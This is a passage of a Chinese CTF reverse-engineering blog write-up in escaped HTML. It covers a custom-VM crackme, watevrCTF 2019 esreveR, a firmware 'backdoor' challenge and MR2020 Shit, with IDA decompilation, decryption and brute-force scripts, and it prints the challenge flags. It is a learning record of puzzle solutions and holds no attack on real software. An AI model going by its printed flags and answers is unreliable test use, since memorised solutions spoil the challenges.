        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mov&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;append_c&amp;#39;&lt;/span&gt;, zero, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;print_a&amp;#39;&lt;/span&gt;, one],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;nop&amp;#39;&lt;/span&gt;],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mov&amp;#39;&lt;/span&gt;, one, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Access denied!&amp;#39;&lt;/span&gt;],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;print_a&amp;#39;&lt;/span&gt;, one],
        [ &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;nop&amp;#39;&lt;/span&gt;]
    ]
)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;将过程变量输出当作动调，就比较容易看懂每条指令在干什么了&lt;/p&gt;
&lt;p&gt;最后发现有用的就是异或135和减15，猜flag头是 &lt;code&gt;watevr&lt;/code&gt;，果然和密文前6个字符对上了&lt;/p&gt;
&lt;p&gt;所以直接一个解密就行&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;á×äÓâæíäàßåÉÛãåäÉÖÓÉäàÓÉÖÓåäÉÓÚÕæïèäßÙÚÉÛÓäàÙÔÉÓâæÉàÓÚÕÓÒÙæäàÉäàßåÉßåÉäàÓÉÚÓáÉ·Ôâ×ÚÕÓÔÉ³ÚÕæïèäßÙÚÉÅä×ÚÔ×æÔÉ×Úïá×ïåÉßÉÔÙÚäÉæÓ×ÜÜïÉà×âÓÉ×ÉÑÙÙÔÉâßÔÉÖãäÉßÉæÓ×ÜÜïÉÓÚÞÙïÉäàßåÉåÙÚÑÉßÉàÙèÓÉïÙãÉáßÜÜÉÓÚÞÙïÉßäÉ×åáÓÜÜ&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x97&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ÉïÙãäãÖÓ&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x9a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ÕÙÛ&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x99&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;á×äÕà©â«³£ï²ÕÔÈ·±â¨ë&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cipher:
    print (chr((ord(c) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;135&lt;/span&gt;), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    
&lt;span style=&#34;color:#75715e&#34;&gt;# watevr{this_must_be_the_best_encryption_method_evr_henceforth_this_is_the_new_Advanced_Encryption_Standard_anyways_i_dont_really_have_a_good_vid_but_i_really_enjoy_this_song_i_hope_you_will_enjoy_it_aswell!_youtube.com/watch?v=E5yFcdPAGv0}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;watevrctf-2019esrever&#34;&gt;[watevrCTF 2019]esreveR&lt;/h2&gt;
&lt;p&gt;用ida打开后，发现大量与输入无关的计算，于是决定先静态跟踪一下输入，然后再动调看过程数据&lt;/p&gt;
&lt;p&gt;和输入有关的大概是这些（动调后写的wp，所以基地址改变了）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    fgets(s, n[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], stdin);
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_5578E4A20943(n[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_5578E4A20996(v14);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)n &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v8 )
    {
      v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_5578E4A209E9(&lt;span style=&#34;color:#ae81ff&#34;&gt;4521&lt;/span&gt;);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( s &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v11 )
      {
        v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sub_5578E4A212D8((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)s, v15, v10, v9, v11, v13);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v4 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v15 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ((v12 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; v13) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)n) )
          puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Congratulations! You reversed the reversed reverse!&amp;#34;&lt;/span&gt;);
      }
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现输入只要输入的地址不等于一个数，然后通过某个判断就行，于是再进到判断前的函数&lt;/p&gt;
&lt;p&gt;会看到一个输入参数很多的函数，进去看一下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  v58 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a57;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a2 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; a57[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] )
    v58 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a3 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; a57[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] )
    v58 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a4 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; a57[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] )
    v58 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( a5 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; a57[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] )
    v58 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;// 以下省略
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输入了57个参数，而且就是判断是否相同的，相同就返回1，否则返回0&lt;/p&gt;
&lt;p&gt;于是猜测这里就是最终的验证函数&lt;/p&gt;
&lt;p&gt;中间经过了一系列动调，确定其它的过程没什么影响，于是在进入函数前下个断点，然后直接去rsp的地址里找比较的数据&lt;/p&gt;
&lt;p&gt;最后的内存数据&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[stack]:00007FFF9B4402F0 dq &#39;{&#39;, &#39;e&#39;, &#39;s&#39;, &#39;r&#39;, &#39;e&#39;, &#39;v&#39;, &#39;e&#39;, &#39;r&#39;, &#39;_&#39;, &#39;r&#39;, &#39;e&#39;, &#39;v&#39;, &#39;e&#39;, &#39;r&#39;, &#39;s&#39;, &#39;e&#39;
[stack]:00007FFF9B4402F0 dq &#39;d&#39;, &#39;_&#39;, &#39;y&#39;, &#39;o&#39;, &#39;u&#39;, &#39;t&#39;, &#39;u&#39;, &#39;b&#39;, &#39;e&#39;, &#39;.&#39;, &#39;c&#39;, &#39;o&#39;, &#39;m&#39;, &#39;/&#39;, &#39;w&#39;, &#39;a&#39;
[stack]:00007FFF9B4402F0 dq &#39;t&#39;, &#39;c&#39;, &#39;h&#39;, &#39;?&#39;, &#39;v&#39;, &#39;=&#39;, &#39;I&#39;, &#39;8&#39;, &#39;i&#39;, &#39;j&#39;, &#39;b&#39;, &#39;4&#39;, &#39;Z&#39;, &#39;e&#39;, &#39;e&#39;, &#39;5&#39;
[stack]:00007FFF9B4402F0 dq &#39;E&#39;, &#39;}&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;连接起来就是flag了&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;firmware&#34;&gt;firmware&lt;/h2&gt;
&lt;p&gt;一道水题，主要学习一下工控逆向&lt;/p&gt;
&lt;p&gt;不难看出，给的附件是squashfs文件，直接进行binwalk&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在安装sasquatch时遇到了一些坑，好像必须clone到~/Downloads等文件夹内才行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;binwalk之后逛一下目录，能够找到一个叫做 &lt;code&gt;backdoor&lt;/code&gt; 的二进制文件&lt;/p&gt;
&lt;p&gt;目标是找到连接的ip和端口，进去找一找就能看到&lt;/p&gt;
&lt;h2 id=&#34;mr2020shit&#34;&gt;[MR2020]Shit&lt;/h2&gt;
&lt;p&gt;这题最后的解法很屑（&lt;/p&gt;
&lt;p&gt;首先是去花，但花指令和CISCN2021-N的RE2一样，就不细说了&lt;/p&gt;
&lt;p&gt;一直尝试反调试，但一直没成功，就用爆破来解了&amp;hellip;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_DA12F0&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a1)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+14h] [ebp-14h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+1Ch] [ebp-Ch]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v4; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+20h] [ebp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v5; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+20h] [ebp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; strlen(a1); i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; )
  {
    v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __ROR4__(a1[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (a1[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (a1[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (a1[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;), dword_DA5034[i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]);
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((v4 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int16&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;HIWORD(v4)) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; dword_DA5034[i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; )
      v5 &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; v2;
    v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v5;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v5 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; dword_DA5018[i &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;既然每四位进行一系列位运算，且密钥只有六位，那就爆破吧&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8C2C133A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0F74CB3F6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0FEDFA6F2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0AB293E3B&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x26CF8A2A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x88A1F279&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(a)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;):
        tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a[t]
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; a[t &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
        tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; i)
        tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((&lt;span style=&#34;color:#f92672&#34;&gt;~&lt;/span&gt;tmp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (tmp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
        res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; n2s(((tmp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; i)) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (tmp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; i)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; res[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; res[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; res[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; res[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;:
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; res[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; res[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;:
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; res[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; res[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;:
                        print (res)
    print ()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后甚至直接上四个 &lt;code&gt;if&lt;/code&gt; 了&amp;hellip;&lt;/p&gt;
&lt;p&gt;爆破结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 必选&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,ag&amp;amp;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#39;f,&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gf,!&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_2{`&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3{`^&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{a_3&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 必选&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;`_3z&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[a2}&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a2y_&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 剩下三个有大括号，排除&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;6}_a&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}_e2&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;re_f&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;e_gs&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;^fse&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fsd_&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_4o2&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;or_t&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2_t/&amp;#39;&lt;/span&gt;

